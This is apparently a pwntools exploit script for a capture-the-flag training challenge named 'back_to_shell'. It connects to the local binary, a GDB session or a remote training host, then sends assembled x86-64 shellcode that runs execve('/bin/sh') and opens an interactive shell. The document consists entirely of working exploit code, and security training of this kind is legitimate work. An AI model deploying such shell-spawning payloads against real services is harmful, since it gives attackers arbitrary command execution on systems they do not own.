from pwn import *

COMMANDS = """
b *0x000000000040116e
c
"""
context.arch = "amd64"

# python3 b.py DEBUG

if args.REMOTE:
    c = remote("back-to-shell.training.offensivedefensive.it", 8080, ssl=True)
else:
    if args.GDB:
        c = gdb.debug("./back_to_shell", gdbscript=COMMANDS)
    else:
        c = process("./back_to_shell")

c.recvuntil(b"Shellcode: ")

shellcode = """
xor eax, eax
mov al, 0x3b
mov rdi, 0x68732f6e69622f
push rdi
mov rdi, rsp
syscall
"""
shellcode_c = asm(shellcode)

c.send(shellcode_c)
c.interactive()
